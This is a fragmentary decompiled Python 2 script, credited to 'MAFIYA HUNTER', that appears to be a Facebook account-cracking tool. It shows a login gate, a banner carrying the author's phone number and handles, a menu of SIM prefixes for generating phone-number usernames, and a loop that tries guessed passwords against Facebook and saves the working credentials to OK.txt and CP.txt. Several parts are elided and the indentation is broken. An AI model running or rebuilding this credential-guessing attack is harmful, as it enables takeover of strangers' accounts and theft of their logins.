# coding: utf-8
# Decompiled By MAFIYA HUNTER
# Github : https://github.com/Blackhacker890/IndHack.git
# uncompyle6 version 1.1.2
# Original written By MAFIYA HUNTER
...
__author__ = 'MAFIYA SOURAV'
__copyright = 'All rights reserved . Copyright  MAFIYA HUNTER'
CorrectUsername = 'MAFIYA'
os.system('clear')
loop = 'true'
while (loop == 'true'):
...
\033[97;1m+-+-+-+-+-+ +-+-+-+-+-+-+
\033[91;1m𝐌𝐀𝐅𝐈𝐘𝐀 𝐇𝐔𝐍𝐓𝐄𝐑 𝐀𝐋𝐋 𝐇𝐀𝐂𝐊𝐄𝐑 𝐊𝐀 𝐁𝐀𝐀𝐏
\033[92;1m+-+-+-+-+-+ +-+-+-+-+-+-+
\033[93;1m𝐍𝐚 𝐇𝐚𝐚𝐭 𝐊𝐢𝐬𝐢 𝐊𝐚 𝐍𝐚 𝐒𝐚𝐡𝐚𝐫𝐚 𝐇𝐚𝐢 𝐊𝐨𝐢 𝐍𝐚 𝐇𝐮𝐦 𝐊𝐢𝐬𝐢𝐊𝐞 𝐍𝐚 𝐇𝐮𝐦𝐚𝐫𝐚 𝐇𝐚𝐢 𝐊𝐨𝐢 
\033[96;1m𝐁𝐡𝐚𝐠𝐰𝐚𝐧/𝐀𝐥𝐥𝐡𝐚/𝐒𝐚𝐛 𝐄𝐤 𝐇𝐚𝐢                               ​                                                                                     
\x1b[0m_________________________________________________
\033[95;1mAuthor   :            𝐌𝐀𝐅𝐈𝐘𝐀 𝐒𝐎𝐔𝐑𝐀𝐕
\033[94;1mFacebook :         ヰ༺豐𝐊𝐈𝐍𝐆ཬྀ豐࿐ヰ
\033[92;1mGitHub   :        𝐒𝐀𝐁 𝐇𝐀𝐂𝐊𝐄𝐑𝐎 𝐊𝐀 𝐀𝐒𝐋𝐈 𝐁𝐀𝐀𝐏
\033[96;1mWhatsapp No  :              +919971945685 
\x1b[0m_________________________________________________
                                                 """
logo1 = '     \n\n\x1b[4;96mSELECT IND  SIM CODE \x1b[1;0m\n\x1b[1;96m[1] Jazz    \x1b[1;97m 00,01,02,03,04,05,06,07,08\n\x1b[1;96m[2] Zong    \x1b[1;97m 11,12,13,14,15,16,17\n\x1b[1;96m[3] Warid   \x1b[1;97m 21,22,23,24,25\n\x1b[1;96m[4] Ufone   \x1b[1;97m 30,31,32,33,34,35\n\x1b[1;96m[5] Telenor \x1b[1;97m 40,41,42,43,44,45,46,47\n\n\n\n\x1bx \x1b[1;97m\x1b[1;0m\n'
back = 0
berhasil = []
cekpoint = []
oks = []
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [ヰ༺豐KINGཬྀ豐࿐ヰ_OK]  ' + k + c + user + '  ^  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m  [ヰ༺豐KINGཬྀ豐࿐_CP] ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [ヰ༺豐KINGཬྀ豐࿐_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [ヰ༺豐KINGཬྀ豐࿐_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
